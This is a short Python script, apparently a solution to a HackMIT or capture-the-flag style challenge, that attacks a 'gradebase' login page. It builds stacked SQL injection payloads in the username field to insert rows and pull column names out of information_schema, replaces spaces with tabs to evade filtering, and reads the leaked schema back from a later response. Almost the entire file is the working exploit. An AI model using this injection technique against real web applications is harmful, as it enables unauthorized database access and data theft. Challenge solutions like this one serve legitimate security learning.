# -*- coding: utf-8 -*-
import string
import random

import requests

# HINT:  Could not choose a best candidate operator. You might need to add explicit type casts.

# x = requests.post("https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/reset")
url = 'https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/login'
users = ['john_doe', 'elonos_mosquitos', 'melon_usk', 'Vivswan_5c6aaa']
columns = ['id', 'username', 'year', 'gender', 'favorite_color']


data = {
    # 'username': "Vivswan_5c6aaa'; INSERT INTO user values (10, 'abc') --",
    'username': "Vivswan_5c6aaa'; INSERT INTO \"user\" values (10, 'abc', (SELECT column_name FROM information_schema.COLUMNS WHERE table_name = 'user' ",
    'password': "%"
}
for i in columns:
    data['username'] += f" and not column_name='{i}' "
data['username'] += " LIMIT 1))  --"

data['username'] = data['username'].replace(" ", " \t ")
x = requests.post(url, data=data)
print(x.text)

x = requests.post(url, data={'username': 'abc'})
for i in x.text.split("\n"):
    if i.__contains__("Year"):
        columns.append(i.replace("Year:", "").replace("<h5>", "").replace("</h5>", "").strip())
        print(columns)
